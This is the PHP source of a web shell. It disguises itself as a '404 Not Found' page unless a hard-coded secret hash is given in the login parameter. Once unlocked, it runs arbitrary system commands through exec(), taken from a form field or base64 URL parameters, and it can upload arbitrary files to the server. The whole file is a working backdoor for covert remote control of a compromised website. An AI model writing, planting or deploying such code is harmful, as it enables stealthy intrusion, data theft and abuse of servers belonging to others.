<?php
$terminal = false;
$command = "";
$error = null;
$success = null;
$login = false;
if (isset($argv[1])) {
    $base64 = $argv[1];
    $terminal = true;
} else {
    session_start();
    if (isset($_SESSION["SHELL_AUTH"])) {
        if ($_SESSION["SHELL_AUTH"] == true) {
            $login = true;
        }
    }
    if ($login == false) {
        if (isset($_GET["login"])) {
            if ($_GET["login"] == "b3a3b9378dbdb23962924c34b10148b8") {
                $_SESSION["SHELL_AUTH"] = true;
                header("Location: " . $_SERVER["REQUEST_SCHEME"] . "://". $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"]);
                exit();
            }
        }//b3a3b9378dbdb23962924c34b10148b8
        http_response_code(404);
        echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
        exit();
    }
}
?>
<?php if ($terminal == false): ?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<?php endif; ?>
<?php if (isset($_GET["upload"])): ?>
    <?php
    if (isset($_POST["upload"])) {
        $direction = "./";
        $file = $direction . basename($_FILES["file"]["name"]);
        $ok = true;
        $type = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        if (file_exists($file)) {
            $error = "Sorry, file already exists.";
            $ok = false;
        }
        if ($ok == false) {
            $error = "Sorry, your file was not uploaded.";
        } else {
            if (move_uploaded_file($_FILES["file"]["tmp_name"], $file)) {
                $success = "The file " . htmlspecialchars(basename($_FILES["file"]["name"])) . " has been uploaded.";
            } else {
                $error = "Sorry, there was an error uploading your file.";
            }
        }
    }
    ?>
    <form method="post" enctype="multipart/form-data" action="?upload" style="display: flex;">
        <input name="file" type="file" style="flex: .9;margin: .2em;">
        <button type="submit" name="upload"  style="flex: .1;margin: .2em;">Upload</button>
    </form>
    <?php if ($error): ?>
        <p style="color: red;padding: .2em 0 .2em 0;margin-top: .2em;"><?= $error ?></p>
    <?php endif; ?>
    <?php if ($success): ?>
        <p style="color: green;padding: .2em 0 .2em 0;margin-top: .2em;"><?= $success ?></p>
    <?php endif; ?>
<?php else: ?>
    <?php
    if (isset($argv[1])) {
        $base64 = $argv[1];
        $terminal = true;
    }
    if (isset($_POST["command"])) {
        $base64 = base64_encode($_POST["command"]);
        $terminal = false;
    }
    if (isset($_GET["base64"])) {
        $base64 = $_GET["base64"];
        $terminal = false;
    }
    if ($base64) {
        $command = base64_decode($base64);
        exec($command, $output, $result);
        if ($terminal) {
            echo "\$ {$command}\n";
            echo implode(PHP_EOL, $output);
        } else {
            $html = null;
            foreach ($output as $line) {
                $html .= htmlspecialchars($line) . PHP_EOL;
            }
        }
    }
    ?>
    <?php if ($terminal == false): ?>
        <div style="margin: 0;padding: 0;display: flex;flex-direction: column">
            <div style="margin: 0;padding: 0;width: 100%;flex: 5vh;">
                <form method="post" action="" style="display: flex;">
                    <input value="<?= htmlspecialchars($command) ?>" name="command" type="text" style="flex: .9;margin: .2em;">
                    <button type="submit" style="flex: .1;margin: .2em;">Run</button>
                </form>
                <hr/>
            </div>
            <div style="overflow: hidden;overflow-y: scroll;flex: 90vh;padding: 0;margin: 0;">
            <pre><code><?= $html ?></code></pre>
            </div>
        </div>
    <?php endif; ?>
<?php endif; ?>
<?php if ($terminal == false): ?>
</body>
</html>
<?php endif; ?>